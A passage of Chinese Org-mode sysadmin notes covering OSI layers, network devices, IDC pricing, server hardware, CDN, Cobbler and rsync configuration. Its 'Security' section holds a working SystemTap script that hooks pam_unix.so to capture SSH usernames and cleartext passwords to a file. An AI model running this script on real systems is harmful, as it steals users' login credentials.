	  #+BEGIN_EXAMPLE
	  服务端和客户端之间的会话
	  使用netstat -nb命令可以查看当前系统建立的会话信息 (Windows)
	  #+END_EXAMPLE
   4. 传输层
	  #+BEGIN_EXAMPLE
	  可以进行可靠传输(事先建立三次握手，流量控制，丢包重传)       
	  与不可靠传输
	  #+END_EXAMPLE
   5. 网络层
	  #+BEGIN_EXAMPLE
	  选择最佳路径
	  网络地址规划
	  #+END_EXAMPLE
   6. 数据链路层
	  #+BEGIN_EXAMPLE
	  如何标识网络设备，使用MAC地址标识设备
	  帧开始和结束
	  数据链路层也具有差错检验机制
	  #+END_EXAMPLE
   7. 物理层
	  #+BEGIN_EXAMPLE
	  定义网络设备接口标准，电压标准
	  #+END_EXAMPLE
	  
   #+BEGIN_EXAMPLE
   网络排错:
   从底层到高层的顺序来排错

   物理层：网线是否连接好
   数据链路层：速率不一致、MAC地址冲突
   网络层：IP地址设置错误、网关错误、子网掩码错误
   应用层：浏览器设置问题

   操作系统问题：重启、重装、格式化 :-)

   替换法排错：
   #+END_EXAMPLE   

   #+BEGIN_EXAMPLE
   OSI参考模型和网络安全
   从安全角度理解OSI参考模型
   物理层安全
   数据链路层安全 无线密码 MAC ADSL拨号
   网络层安全 基于IP地址实现的数据包过滤 封端口
   传输层安全
   应用层安全 Web漏洞 数据库漏洞
   #+END_EXAMPLE

** 网络设备
   #+BEGIN_EXAMPLE
   网线：8根 10M及100M(使用了4根线1 3 2 6) 1000M(8根全部使用)
	   直通线(适合计算机连接交换机及集线器)
	   交叉线(适合两台计算机直连，由于计算机之间可以协商，直通线也是可以使用的)
	   全反线(一般用于配置交换机及路由器时使用的线缆)

   集线器(HUB) 冲突域 不安全 带宽共享 建议使用30台机器以内
   网桥 能够学习及构造MAC地址表 基于MAC地址转发数据 划分冲突域
   交换机 能够构造MAC地址表 比网桥性能好 安全 带宽端口独享 转发广播包到所有接口
   路由器 广域网接口 不同网段之间转发数据 隔绝广播
   #+END_EXAMPLE

   网络设备和OSI参考模型
   #+BEGIN_EXAMPLE
   网络层设备 --> 路由器
   数据链路层设备 --> 交换机
   物理层设备 --> 网线、集线器
   #+END_EXAMPLE
** 数据封装
   #+BEGIN_EXAMPLE
   数据由应用层提供
   源端口目标端口数据段或消息
   目标IP地址源IP地址数据包
   目标MAC地址源MAC地址数据帧
   #+END_EXAMPLE
** 传输模式
   #+BEGIN_EXAMPLE
   按数据流向分为三种传输模式：
   单工
   半双工 对讲机
   全双工 手机
   #+END_EXAMPLE
** Cisco组网三层模型
   Cisco的层次模型可以用来帮助设计、实现和维护可扩展、可靠、性能价格比
   高的层次化的互联网络，Cisco定义了3个层次，每一层都有特定的功能：
   - 接入层(Layer 2 Switching)，最终用户被许可接入网络的点
   - 汇聚层(Layer 3 Switching)，接入层设备的汇聚点
   - 核心层(Layer 2/Layer 3 Switching)，高速交换背板，不进行任何过滤，因为会影响转发速度

   #+BEGIN_EXAMPLE
   核心层
   汇聚层
   接入层
   #+END_EXAMPLE
** TCP/IP协议和网络安全
*** 在TCP/IP中包含一系列用于处理数据通信的协议
	+ TCP(传输控制协议)        - 应用程序之间通信
	+ UDP(用户数据包协议)      - 应用程序之间的简单通信
	+ IP(网际协议)             - 计算机之间的通信
	+ ICMP(因特网消息控制协议) - 针对错误和状态
	+ DHCP(动态主机配置协议)   - 针对动态寻址

*** TCP使用固定的连接
	TCP用于应用程序之间的通信。

	当应用程序希望通过TCP与另一个应用程序通信时，它会发送一个应用请求。
	这个请求必须被送到一个确切的地址。在双方“握手”之后，TCP将在两个应
	用程序之间建立一个全双工(full-duplex)的通信。

	这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双
	方关闭为止。

	UDP和TCP很相似，但是更简单，同时可靠性低于TCP。

*** IP是无连接的
	IP用于计算机之间的通信。

	IP是无连接的通信协议。它不会占用两个通信的计算机之间的通信线路。
	这样，IP就降低了对网络线路的需求。每条线可以同时满足许多不同计算
	机之间的通信需要。
	
	通过IP，消息(或者其他数据)被分隔为小的独立的包，并通过因特网在
	计算机之间传送。

	IP负责将每个包路由至它的目的地。

*** IP路由器
	当一个 IP 包从一台计算机被发送，它会到达一个 IP 路由器。

	IP路由器负责将这个包路由至它的目的地，直接地或者通过其他的路由器。

	在一个相同的通信中，一个包所经由的路径可能会和其他的包不同。而路
	由器负责根据通信量、网络中的错误或者其他参数来进行正确地寻址。

*** TCP/IP
	TCP/IP意味着TCP和IP在一起协同工作。

	TCP负责应用软件(比如你的浏览器)和网络软件之间的通信。
	
	IP负责计算机之间的通信。
	
	TCP负责将数据分割并装入IP包，然后在它们到达的时候重新组合它们。
	
	IP负责将包发送至接受者。

    #+BEGIN_EXAMPLE
	传输层协议
	TCP 可靠传输 编号 丢包重传 流量控制 三次握手 建立会话
	UDP 不可靠传输 不需要编号 不建立会话

	land攻击 目标地址与源地址相同的数据包 建立会话
	syn半连接攻击 伪造源地址
	
	应用层协议和传输层协议之间的关系：
	http=TCP+80
	https=TCP+443
	ftp=TCP+21
	smtp=TCP+25
	pop3=TCP+110
	rdp=TCP+3389
	dns=udp+53
	Windows共享文件夹=TCP+445
	SQL Server=TCP+1433
	mysql=tcp+3306
	telnet=tcp+23

	服务与应用层之间的关系：
	服务运行后就会在TCP或UDP的某个端口侦听客户端的请求
	#+END_EXAMPLE
	韩立刚老师视频下载 http://down.51cto.com/zt/6042
* Security
** stap获取SSH密码
   原理主要是对PAM模块pam_unix.so库文件的函数调用进行捕获，因为用户登
   录认证需要使用pam_unix.so库文件。
   #+BEGIN_SRC bash
   # yum update
   # debuginfo-install $(rpm -qf /lib64/security/pam_unix.so)
   #+END_SRC

   #+BEGIN_EXAMPLE
   audit-debuginfo       
   cracklib-debuginfo    
   db4-debuginfo         
   glibc-debuginfo       
   libselinux-debuginfo  
   pam-debuginfo         
   yum-plugin-auto-update-debug-info 
   glibc-debuginfo-common            
   #+END_EXAMPLE
   
   debuginfo-install工具会安装与$(rpm -qf
   /lib64/security/pam_unix.so)rpm包相关的debug软件包。然后安装systemtap，

   #+BEGIN_SRC bash
   # yum install -y systemtap
   #+END_SRC

   stap脚本：
   #+BEGIN_EXAMPLE
   #!/usr/bin/stap
   global username, pass, isSuccRet = 1;
   probe process("/lib64/security/pam_unix.so").function("_unix_verify_password")
   {
   username = user_string($name);
   pass = user_string($p);
   }
   probe process("/lib64/security/pam_unix.so").function("_unix_verify_password").return
   {
   if ($return == 0)
   {
	   printf("User: %s\nPassword: %s\n\n", username, pass);
	   isSuccRet = 0;
   }
   }
   probe process("/lib64/security/pam_unix.so").function("pam_sm_open_session")
   {
   if (isSuccRet != 0)
   {
	   printf("Login via ssh service.\n\User: %s\nPassword: %s\n\n", username, pass);
   }
   isSuccRet = 1;
   }
   #+END_EXAMPLE

   运行stap脚本：
   #+BEGIN_SRC bash
   # stap capture_password.stp -o password.txt
   #+END_SRC
* H3C
* IDC
** 带宽计算
** 什么情况需要去机房维护
   1. 公司购买了新服务器，可能把服务器运到公司，安装完系统，配置好基础
      配置，然后运到机房上架，也可直接拉到机房安装系统(如果机房有公司
      的人员的时候)。
   2. 机器运行异常，无法远程维护了，机房人员帮助未果，需要重装系统(远
      程控制卡可代替去机房)等。远程控制卡最好是独立的(非集成)。
   3. 网络异常，如网线，交换机等。
** 机房带宽价格
   1. 带宽费
	  #+BEGIN_EXAMPLE
	  200-1000元/M/月 (一般是多线路)
	  20-200元/M/月 (外地(普通的2-3线级城市)价格)
	  #+END_EXAMPLE
   2. 机柜费
	  #+BEGIN_EXAMPLE
	  一个机柜：4-5W/年，单个机器1U 2000元，2U 3000元
	  #+END_EXAMPLE
   3. 机柜电力
	  #+BEGIN_EXAMPLE
	  电力：一般一个机柜是10-13A(一般电信机房10A，网通机房13A)，
	  A,B两路各10-13A。

	  标准：一个机柜标准高度42U

	  放置服务器1u 15-20台，2u 10台左右。

	  机器接电及摆放建议：
	  机器双电源分别接A、B两路，多服务器时，要根据不同的业务，
	  尽可能放置在不同的机柜，从物理接线摆放上确保业务的稳定。
	  如：MySQL服务器需要放置在不同的机柜内。
	  #+END_EXAMPLE
*** 带宽独享价格
    | 机型     | IP数 | 带宽     | 报价        |
    |----------+------+----------+-------------|
    | 半个机柜 |    7 | 100M独享 | 360000元/年 |
    | 一个机柜 |   16 | 100M独享 | 450000元/年 |
    | \/       |   16 | 100M独享 | 300000元/年 | 

	独享带宽说明：
	#+BEGIN_EXAMPLE
	特价：450元/M/月；
	一个机柜：60000元/年；
	额定电流：10A；
	#+END_EXAMPLE

	详细说明：
	#+BEGIN_EXAMPLE
	电信标准机柜，独享用户拥有独立Vlan
	#+END_EXAMPLE
*** BGP机房(多线路机房)
**** 什么是BGP
	 BGP边界网关协议，是一种用来在不同的运营商之间传递大量路由信息的路
	 由协议。

**** 什么是BGP机房
	 简单的说，BGP机房就是将IDC网络和多个运营商互联起来，实现单IP绑定
	 在多条线路上，所有互联运营商(电信，网通等)的用户访问IDC的网络，
	 都会智能的走相应的线路，达到访问速度都很快的目的。

**** BGP机房有什么优点
	 1. 服务器只需要设置一个IP地址，最佳访问路由是由网络上的骨干路由器
        根据路由跳数与其他技术指标来确定的，不会占用服务器的任何系统资
        源。服务器的上行路由与下行路由都能选择最优的路径，所以能真正实
        现高速的单IP高速访问。
	 2. 由于BGP协议本身具有冗余备份、消除环路的特点，所以当IDC服务商有
        条BGP互联线路时，可以实现路由的相互备份，在一条线路出现故障时
        路由会自动切换到其他线路。
	 3. 使用BGP协议还可以使网络具有很强的扩展性，可以将IDC网络与其他运
        营商互联，

**** 单线机房还有人用么
	 外地有大量的单线机房，还会有人用吗？当然会，因为成本的关系。
	 1. CDN会用。CDN通过智能DNS解析判断用户的地域及运营商来源，进而，
        重新分配最近的适合用户访问的线路。这大大降低了带宽成本(单线路
        带宽成本可能仅有M/20-50元/月，甚至更低)。
	 2. 游戏公司、下载站等，如QQ游戏，业务里标着电信、网通，让用户选择
        去接入。
	 3. 其他。

**** IDC机房测试报告
*** 服务器硬件选型
	Dell是一款性价比不错的品牌，大多数互联网公司的选择。
	
	所有服务器要带独立的远程管理卡。
**** 早期约5年前的DELL服务器系列
	 | 单位 | 型号           | 一般用途                 |
	 |------+----------------+--------------------------|
	 | 1U   | Dell 1850 1950 | 可用于web，lvs等         |
	 | 2U   | Dell 2850 2950 | 可用于MySQL，存储等      |
	 | 4U   | Dell 6850      | 可用于Oracle，共享存储等 |
**** 近期约2年Dell服务器系列
	 | 单位 | 早期型号       | 对应的近期型号      | 一般用途                 |
	 |------+----------------+---------------------+--------------------------|
	 | 1U   | Dell 1850 1950 | Dell R310 R410 R610 | 可用于web，lvs等         |
	 | 2U   | Dell 2850 2950 | Dell R710           | 可用于MySQL等            |
	 | 4U   | Dell 6850      | Dell R810 R910      | 可用于Oracle，共享存储等 | 
**** 生产环境负载均衡集群系统架构设备选购案例
	 选购的依据：价格，性能，冗余
***** 负载均衡器硬件选择及RAID级别
	  #+BEGIN_EXAMPLE
	  LVS1主：DELL R610 1U，CPU E5606*2，4G*2内存 硬盘：SAS 146G*2 RAID1
	  LVS2主：DELL R610 1U，CPU E5606*2，4G*2内存 硬盘：SAS 146G*2 RAID1
	  #+END_EXAMPLE
***** WEB层硬件选择及RAID级别
	  #+BEGIN_EXAMPLE
	  WWW主站1业务(两台)：DELL R710，CPU E5606*2，4G*4内存 硬盘：SAS 300*2 RAID0
	  WWW主站2业务(两台)：DELL R710，CPU E5606*2，4G*4内存 硬盘：SAS 300*2 RAID0
	  #+END_EXAMPLE
***** 数据库层硬件选择及RAID级别(适合MySQL和Oracle)
	  #+BEGIN_EXAMPLE
	  MySQL主库1-1：Dell R710，CPU E5606*2 4G*8 SAS 600G*6(或146G*6)RAID10
	  MySQL主库1-2：Dell R710，CPU E5606*2 4G*8 SAS 600G*6(或146G*6)RAID10
	  MySQL从库1-1：Dell R710，CPU E5606*2 4G*4 SAS 15K 600G*4 RAID10或RAID5
	  MySQL从库1-2：Dell R710，CPU E5606*2 4G*4 SAS 15K 600G*4 RAID10或RAID5
	  MySQL从库2-1：Dell R710，CPU E5606*2 4G*4 SAS 15K 600G*4 RAID10或RAID5
	  MySQL从库2-2：Dell R710，CPU E5606*2 4G*4 SAS 15K 600G*4 RAID10或RAID5
	  #+END_EXAMPLE
	  跑多实例数据库，提升利用率。
***** 数据备份硬件选择及RAID级别
	  #+BEGIN_EXAMPLE
	  DELL R610，E5606*2 16G SATA 10K 2T*4 可以不做RAID 交叉备份
	  DELL R710，E5606*2 16G SATA 10K 2T*6 RAID5，做个RAID5是折中方案 
	  #+END_EXAMPLE
***** 共享存储NFS硬件选择及RAID级别
	  #+BEGIN_EXAMPLE
	  NFS1: DELL R710, E5606*2, 16G SAS 15K 600G*6 RAID10/RAID5/RAID0
	  NFS2: DELL R710, E5606*2, 16G SAS 15K 600G*6 RAID10/RAID5
	  #+END_EXAMPLE
	  分布式存储MFS，GFS：普通服务器配置就可以了。
** CDN
*** 什么是CDN
	CDN(Content Delivery Network)，即内容分发网络。其基本思路是尽可
	能避开互联网上有可能影响数据传输速度和稳定性的瓶颈环节，使内容传输
	的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网
	基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点
	的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重
	新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解
	决Internet网络拥挤的状况，提高用户访问网站的响应速度。
*** CDN特点
	1. 本地Cache加速提高了企业站点(尤其含有大量图片和静态页面站点)的
       访问速度，并大大提高以上性质站点的稳定性(省钱，用户体验提升)。
	2. 镜像服务消除了不同运营商之间互联的瓶颈造成的影响，实现了跨越运
       营商的网络加速，保证不同网络中的用户都能得到良好的访问质量。
	3. 远程访问用户根据DNS负载均衡技术智能自动选择Cache服务器，选择最
       快的Cache服务器，加快远程访问的速度。
	4. 带宽优化 自动生成服务器的远程Mirror(镜像)cache服务器，远程用
       户访问时从cache服务器上读取数据，减少远程访问的带宽、分担网络流
       量、减轻原站点WEB服务器负载等功能。
	5. 集群抗击广泛分布的CDN节点加上节点之间的智能冗余机制，可以有效地
       预防黑客入侵以及降低各种DDos攻击对网站的影响，同时保证较好的服
       务质量。
*** CDN用途
	企业或门户网站的图片、视频、CSS、JS、HTML等静态数据的缓存。
* Cobbler
  安装所需的软件包：
  #+BEGIN_EXAMPLE
  # yum install -y httpd dhcp tftp cobbler cobbler-web pykickstart
  #+END_EXAMPLE
  
  #+BEGIN_EXAMPLE
  # service httpd start
  # service cobblerd start
  # cobbler check # 检查是否通过，根据不通过的提示，进行修改配置文件
  # vim /etc/cobbler/settings
    server: xxx.yyy.zzz.vvv
    next_server: xxx.yyy.zzz.vvv
  # /etc/init.d/xinetd restart
  # cobbler get-loaders
  # openssl passwd -1 -salt 'lavenliu' 'laven'
  fjsakjfsdkjfkdseri
  # service cobblerd restart
  # cobblerd check
  # 如果检查没有问题，可以执行:
  # cobbler sync
  # vim /etc/cobbler/dhcp.template
  #+END_EXAMPLE

  配置完毕，接下来设置镜像：
  #+BEGIN_EXAMPLE
  # mount /dev/cdrom /mnt
  # cobbler import --path=/mnt --name=CentOS-6.5-x86_64 --arch=x86_64
  # cobbler profile report # 可以找到默认ks配置文件
  # 准备自定义的ks文件
  # cd /var/lib/cobbler/kickstarts
  # cobbler profile edit --name=CentOS-6.5-x86_64 --kickstart=/var/lib/cobbler/kickstarts/CentOS-6.5.x86_64.ks
  # cobbler profile report
  # 每次改动，要执行sync动作
  # cobbler sync
  #+END_EXAMPLE
  
  镜像文件被复制到了/var/www/cobbler/ks_mirror/CentOS-6.5-x86_64目录下。
* Rsync
** 什么是rsync
   rsync（Remote synchronization）是一款开源的、快速的、多功能的、可实
   现全量及增量的本地或远程数据同步备份的优秀工具。一个rsync相当于scp、
   cp及rm命令，但是还优于它们每一个命令。这三个命令都是全量的拷贝或删
   除。

   主要功能是在本地和远程两台主机之间的数据快速复制同步镜像、远程备份。

   在同步备份数据时，默认情况下，rsync通过其独特的“quick check”算法，
   它仅同步大小或最后修改时间发生变化的文件或目录，当然也可根据权限、
   属主等属性的变化同步，但需要指定相应的参数，甚至可以实现只同步一个
   文件里有变化的内容部分，所以，可以实现快速的同步备份数据。

   提示：传统的cp、scp工具拷贝每次均为完整的拷贝，而rsync除了可以完整
   拷贝外，还具备增量拷贝的功能，因此，从同步数据的性能及效率上，rsync
   工具更胜一筹。
** Rsync的特性
   官网介绍
*** rsync优点
	增量备份同步，支持守护进程，集中备份。
*** rsync缺点
	1. 大量小文件同步时候，比对时间较长，有的时候，rsync进程停止。
	   #+BEGIN_EXAMPLE
	   常用解决方法：
	   1. 打包后再同步
	   2. drbd（文件系统同步，复制block）
	   #+END_EXAMPLE
	2. 同步大文件，10G这样的大文件有时也会有问题，中断。未完整同步前，
       是隐藏文件，同步完成变成正常文件。
** Rsync的企业工作场景说明
*** 两台服务器之间数据同步crond+rsync
*** 把所有客户服务器数据同步到备份服务器
	生产场景集群架构服务器备份方案cron+rsync
	1. 针对公司重要数据备份混乱状况和领导提出的备份全网数据的解决方案
	2. 通过本地打包备份，然后rsync结合inotify应用把全网数据统一备份到
       一个固定存储服务器，然后在存储服务器上通过脚本检查并报警管理员
       备份结果。
	3. 定期将IDC机房的数据备份公司的内部服务器，防止机房地震及火灾问题
       导致数据丢失。
*** rsync结合inotify的功能做实时的数据同步rsync+inotify或sersync
** Rsync的工作方式
   rsync大致使用三种主要的传输数据的方式。分别为：
   1. 单个主机本地之间的数据传输（此时类似于cp的命令的功能）
	  #+BEGIN_SRC sh
[root@rsync-server ~]# rsync -azv /etc/hosts /tmp
sending incremental file list
hosts

sent 167 bytes  received 31 bytes  396.00 bytes/sec
total size is 216  speedup is 1.09
[root@rsync-server ~]# cat /tmp/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
192.168.56.199 rsync-server
192.168.56.200 rsync-client01[root@rsync-server ~]# rsync -azv /etc/hosts /tmp
sending incremental file list
hosts

sent 167 bytes  received 31 bytes  396.00 bytes/sec
total size is 216  speedup is 1.09
[root@rsync-server ~]# cat /tmp/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
192.168.56.199 rsync-server
192.168.56.200 rsync-client01

# 一个实例 -- 相当于rm命令
rsync -avz --delete /source /dest
# 意思是把/source目录的文件同步到/dest目录，且如果/dest目录有的文件而
# /source目录里没有的文件，会被删除。相当于rm功能。
	  #+END_SRC
   2. 借助rcp、ssh等通道来传输数据（此时类似于scp命令的功能）
	  #+BEGIN_SRC sh
rsync -avzP -e 'ssh -p 22' /tmp root@192.168.56.200:/tmp # 注意/tmp的写法，与/tmp/的写法意义不同
sending incremental file list
tmp/
tmp/.java_pid2329
tmp/all_db-2015-11-30_15-46.sql
      828695 100%    6.66MB/s    0:00:00 (xfer#1, to-check=13/16)
tmp/all_db-2015-11-30_15-51.sql
           0 100%    0.00kB/s    0:00:00 (xfer#2, to-check=12/16)
tmp/all_db-2015-11-30_15-56.sql
           0 100%    0.00kB/s    0:00:00 (xfer#3, to-check=11/16)
tmp/all_db-2015-11-30_15-57.sql
      828695 100%    3.76MB/s    0:00:00 (xfer#4, to-check=10/16)
tmp/hosts
         216 100%    1.00kB/s    0:00:00 (xfer#5, to-check=9/16)
tmp/jdk.tar.gz
   181260798 100%    3.72MB/s    0:00:46 (xfer#6, to-check=8/16)
tmp/tmpk01iQt
        1821 100%    1.92kB/s    0:00:00 (xfer#7, to-check=7/16)
tmp/yum.log
           0 100%    0.00kB/s    0:00:00 (xfer#8, to-check=6/16)
tmp/yum_save_tx-2015-11-11-06-48287cLz.yumtx
         270 100%    0.28kB/s    0:00:00 (xfer#9, to-check=5/16)
tmp/yum_save_tx-2015-11-11-09-26ydGpYj.yumtx
         265 100%    0.28kB/s    0:00:00 (xfer#10, to-check=4/16)
tmp/yum_save_tx-2015-11-12-07-04nGbrF6.yumtx
         288 100%    0.30kB/s    0:00:00 (xfer#11, to-check=3/16)
tmp/yum_save_tx-2015-11-12-07-126WBCyj.yumtx
         288 100%    0.29kB/s    0:00:00 (xfer#12, to-check=2/16)
tmp/.ICE-unix/
tmp/jna-3506402/

sent 181092676 bytes  received 255 bytes  3658443.05 bytes/sec
total size is 182921336  speedup is 1.01

# 关键语法说明
-avz相当于-vzrtopgD1，表示同步时文件和目录属性不变。
-P 显示同步的过程，可以用--progress替换
-e 'ssh -p 22' 表示通过ssh的通道传输数据，-p 22可省略
	  #+END_SRC
   3. 以守护进程的方式传输数据（这个是rsync自身的重要功能）
** Rsync客户端常用参数
   SCHEDULED: <2016-03-06 周日>
   | 参数           | 说明                                                   |
   |----------------+--------------------------------------------------------|
   | -v             | 详细模式输出，传输时的进度等信息                       |
   |----------------+--------------------------------------------------------|
   | -z             | 传输时进行压缩以提高传输效率                           |
   |----------------+--------------------------------------------------------|
   | -a             | 归档模式，表示以递归方式传输文件，并保持文件的所有属性 |
   |----------------+--------------------------------------------------------|
   | -r             | 递归模式                                               |
   |----------------+--------------------------------------------------------|
   | -t             | 保持文件时间信息                                       |
   |----------------+--------------------------------------------------------|
   | -o             | 保持文件属主信息                                       |
   |----------------+--------------------------------------------------------|
   | -p             | 保持文件权限                                           |
   |----------------+--------------------------------------------------------|
   | -g             | 保持文件属组信息                                       |
   |----------------+--------------------------------------------------------|
   | -P             | 显示同步过程及传输时的进度等信息                       |
   |----------------+--------------------------------------------------------|
   | -D             | 保持设备文件信息                                       |
   |----------------+--------------------------------------------------------|
   | -l             | 保留软链接                                             |
   |----------------+--------------------------------------------------------|
   | -e             | 使用的信道协议，                                       |
   |----------------+--------------------------------------------------------|
   | --exclude      | 指定排除不需要传输的文件模式                           |
   |----------------+--------------------------------------------------------|
   | --exclude-from | 文件名所在的目录文件                                   |
   |----------------+--------------------------------------------------------|
   | --bwlimit      | 限制传输速率                                           |
   
   工作中最常用的参数为avz，相当于vzrtopgDl
** 配置Rsync服务端
   SCHEDULED: <2016-03-06 周日>
   环境准备：
   #+CAPTION: rsync环境一览
   | 主机名         |             IP | 说明           |
   |----------------+----------------+----------------|
   | rsync-server   | 192.168.56.199 | 全网备份服务器 |
   | rsync-client01 | 192.168.56.200 | 客户端01       |
   | rsync-client02 | 192.168.56.201 | 客户端02       | 

   rsync服务端的配置文件默认不存在，现在手工创建，
   #+BEGIN_SRC sh
[root@rsync-server ~]# cat /etc/rsyncd.conf 
# rsync server
# created by lavenliu 2016-03-06
uid = rsync # 客户端连接过来具备什么用户的权限
gid = rsync # 
use chroot = no # 和安全相关的设置，
max connections = 2000 # 设置客户端的最大连接数
timeout = 600 # 客户端连接服务端的超时时间
pid file = /var/run/rsyncd.pid   # rsync服务运行时的pid文件
lock file = /var/run/rsyncd.lock # rsync服务运行时的lock文件
log file = /var/log/rsyncd.log   # rsync服务运行时产生的日志文件
ignore errors # 忽略同步过程中出现的错误
read only = false # 读写模式
list = false # 禁用远程列表功能
hosts allow = 192.168.56.0/24 # 明确允许哪些客户端
hosts deny = 0.0.0.0/32 # 明确拒绝哪些客户端
auth users = rsync_backup # 认证用户，这里是虚拟的用户，与系统用户无关
secrets file = /etc/rsync.password # 存放虚拟用户的密码文件

#########################################
[backup] # 共享的目录
comment = backup server by lavenliu 2016-03-06
path = /backup # 要共享的目录

[bbs]
comment = bbs by lavenliu 2016-03-06
path = /data0/www/bbs

[blog]
comment = blog by lavenliu 2016-03-06
path = /data0/www/blog
   #+END_SRC
   
   更多内容见,
   #+BEGIN_SRC sh
man rsyncd.conf
   #+END_SRC

   好了，有了配置文件。接下来就可以启动rsync服务了。启动之前需要做一些
   准备工作，
   #+BEGIN_SRC sh
# 准备工作
[root@rsync-server ~]# useradd rsync -s /sbin/nologin -M
[root@rsync-server ~]# mkdir /backup
[root@rsync-server ~]# chown -R rsync /backup
[root@rsync-server ~]# ll -d /backup/
drwxr-xr-x 2 rsync root 4096 Mar  6 06:09 /backup/
[root@rsync-server ~]# echo "rsync_backup:lavenliu" > /etc/rsync.password
[root@rsync-server ~]# cat /etc/rsync.password
rsync_backup:lavenliu
[root@rsync-server ~]# chmod 600 /etc/rsync.password
[root@rsync-server ~]# ls -l /etc/rsync.password
-rw------- 1 root root 22 Mar  6 06:12 /etc/rsync.password
# 启动服务
rsync --daemon
ps -ef |grep rsync |grep -v grep
root      1632     1  0 05:19 ?        00:00:00 rsync --daemon
[root@rsync-server ~]# netstat -antup |grep 873
tcp        0      0 0.0.0.0:873                 0.0.0.0:*                   LISTEN      1632/rsync          
tcp        0      0 :::873                      :::*                        LISTEN      1632/rsync          
[root@rsync-server ~]# lsof -i:873
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
rsync   1632 root    3u  IPv4  10927      0t0  TCP *:rsync (LISTEN)
rsync   1632 root    5u  IPv6  10928      0t0  TCP *:rsync (LISTEN)
   #+END_SRC

   配置rsync服务端步骤总结，
   1. 创建/etc/rsyncd.conf
	  #+BEGIN_SRC sh
cat > /etc/rsyncd.conf << EOF
# rsync server
# created by lavenliu
uid = rsync
gid = rsync
use chroot = no
max connections = 2000
timeout = 600
pid file = /var/run/rsyncd.pid
lock file = /var/run/rsyncd.lock
log file = /var/log/rsyncd.log
ignore errors
read only = false
list = false
hosts allow = 192.168.56.0/24
hosts deny = 0.0.0.0/32
auth users = rsync_backup
secrets file = /etc/rsync.password

#########################################
[backup]
comment = backup by lavenliu 2016-03-06
path = /backup
EOF
	  #+END_SRC
   2. 创建rsync用户，及共享目录/backup
	  #+BEGIN_SRC sh
useradd rsync -s /sbin/nologin -M
mkdir /backup
	  #+END_SRC
   3. 设置/backup的属主信息为rsync
	  #+BEGIN_SRC sh
chown -R rsync /backup
ls -ld /backup
	  #+END_SRC
   4. 创建密码文件/etc/rsync.password
	  #+BEGIN_SRC sh
echo "rsync_backup:lavenliu" > /etc/rsync.password
	  #+END_SRC
   5. 修改密码文件的权限为600
	  #+BEGIN_SRC sh
chmod 600 /etc/rsync.password
	  #+END_SRC
   6. 启动rsync服务进程
	  #+BEGIN_SRC sh
rsync --daemon
	  #+END_SRC
   7. 加入开机自启动
	  #+BEGIN_SRC sh
echo "rsync --daemon" >> /etc/rc.local
cat /etc/rc.local
	  #+END_SRC

	  *重启rsync的组合命令*
	  #+BEGIN_SRC sh
pkill rsync
kill `cat /var/run/rsyncd.pid`
rsync --daemon
	  #+END_SRC
** Rsync客户端配置
   客户端不需要配置文件，但需要一个密码文件，

   #+BEGIN_SRC sh
echo "lavenliu" > /etc/rsync.password
chmod 600 /etc/rsync.password
ls -l /etc/rsync.password
cat /etc/rsync.password
   #+END_SRC

   开始使用，我们在rsync-client01上做推送的动作，

   #+BEGIN_SRC sh
rsync -avz /tmp/ rsync_backup@192.168.56.199::backup \
--password-file=/etc/rsync.password
# 注意，/tmp与/tmp/的区别，
# /tmp  - 把客户端的/tmp目录及目录里的文件复制到服务端
# /tmp/ - 把客户端的/tmp目录下的文件复制到服务端（不包括/tmp目录本身）
   #+END_SRC

   在rsync-client02上把rsync-server上的backup拉取到本地的/tmp目录下，
   #+BEGIN_SRC sh
rsync -avz rsync_backup@192.168.56.199::backup /tmp/ \
--password-file=/etc/rsync.password
   #+END_SRC
** 无差异同步(--delete)
   使用选项"--delete"，可以实现无差异同步。
   #+BEGIN_EXAMPLE
   推送：本地有，远端就有；本地没有，删除远端独有的。（可以先备份远端数据）
   拉取：远端有，本地就有；远端没有，删除本地独有的。（可以先备份本地数据）
   #+END_EXAMPLE
** 排除文件(--exclude)
*** 客户端rsync排除命令
**** 排除单个文件
	 #+BEGIN_SRC sh
rsync -avz --exclude=a /data1 rsync_backup@192.168.56.199::backup \
	  --password-file=/etc/rsync.password
	 #+END_SRC
**** 排除多个文件
	 #+BEGIN_SRC sh
rsync -avz --exclude={a,b} /data1/ rsync_backup@192.168.56.199::backup \
	  --password-file=/etc/rsync.password
rsync -avz --exclude=a --exclude=b /data1/ rsync_backup@192.168.56.199::backup \
	  --password-file=/etc/rsync.password
rsync -avz --exclude={a..g} /data1/ rsync_backup@192.168.56.199::backup \
	  --password-file=/etc/rsync.password
rsync -avz --exclude-from=paichu.log /data1/ rsync_backup@192.168.56.199::backup \
	  --password-file=/etc/rsync.password # 把排除的文件放到一个文件里
	 #+END_SRC
*** 服务端rsync排除命令
	在配置文件/etc/rsyncd.conf里加exclude=a b test/lavenliu.txt
** rsync+crond实现定时数据备份
*** 客户端操作
	#+BEGIN_SRC sh
mkdir /backup/`ifconfig eth0 |awk -F '[ :]+' 'NR==2 { print $4 }'`_$(date +%F) -p
/bin/cp /etc/rc.local /backup/192.168.56.200_2016-03-06/rc.local_$(date +%F)
/bin/cp /var/spool/cron/root /backup/192.168.56.200_2016-03-06/cron_root_$(date +%F)
rsync -az /backup/ rsync_backup@192.168.56.199::backup/ \
--password-file=/etc/rsync.password
	#+END_SRC

	写成脚本的形式，
	#+BEGIN_SRC sh
cat /server/scripts/bak.sh
#!/bin/bash

RSYNC_SERVER=192.168.56.199
RSYNC_MOUDLE=backup
MY_PATH=/backup/
MY_DIR="`ifconfig eth0 |awk -F '[ :]+' 'NR==2 { print $4 }'`_$(date +%F)"
mkdir -p ${MY_PATH}/${MY_DIR} && /bin/cp /var/spool/cron/root ${MY_PATH}/${MY_DIR}/cron_root_$(date +%F) \
&& /bin/cp /etc/rc.local ${MY_PATH}/${MY_DIR}/rc.local_$(date +%F) \
&& rsync -az ${MY_PATH}/ rsync_backup@${RSYNC_SERVER}::${RSYNC_MOUDLE}/ --password-file=/etc/rsync.password
	#+END_SRC

	设置定时任务，
